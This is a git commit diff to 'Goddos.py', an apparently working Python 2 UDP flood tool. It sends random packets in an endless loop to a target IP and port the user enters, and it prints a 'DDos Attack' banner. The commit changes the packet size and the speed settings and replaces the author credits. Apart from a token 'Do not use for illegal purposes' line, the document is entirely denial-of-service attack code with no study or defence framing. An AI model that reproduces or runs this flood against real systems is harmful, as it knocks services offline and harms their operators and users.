38545330223e588c0d820e49837237be18b5d0be
Makara <152614418+soreungmakara2@users.noreply.github.com>
2024-01-03 23:38:51 +0700

    Update Goddos.py

--- Goddos.py
+++ Goddos.py
@@ -1,3 +1,4 @@
+
 # python2
 
 import sys
@@ -16,16 +17,16 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(5000)
+bytes = random._urandom(1490)
 #############
 
 os.system("clear")
 os.system("figlet DDos Attack")
 print " "
-print "/---------------------------------------------------\ ::::::::"
-print "|   Author          : mkra            |"
-print "|   Author github   :  https://github.com/soreungmakara2/Makra"
-print "|             
+print "/---------------------------------------------------\ "
+print "|   Author          : Andysun06                     |"
+print "|   Author github   : https://github.com/Andysun06  |"
+print "|   Kali-QQ learning group : 909533854              |"
 print "|   Edition         : V1.0.0                        |"
 print "\---------------------------------------------------/"
 print " "
@@ -33,7 +34,7 @@ print " ---------[Do not use for illegal purposes]--------- "
 print " "
 ip = raw_input("Input IP     : ")
 port = int(input("Attack port  : "))
-sd = int(input("Attack speed(1~5000) : "))
+sd = int(input("Attack speed(1~1000) : "))
 
 os.system("clear")
 
@@ -42,4 +43,4 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      print "Sent %s packet to %s throught port:%d"%(sent,ip,port)
-     time.sleep((5000-sd)/5000)
+     time.sleep((1000-sd)/2000)
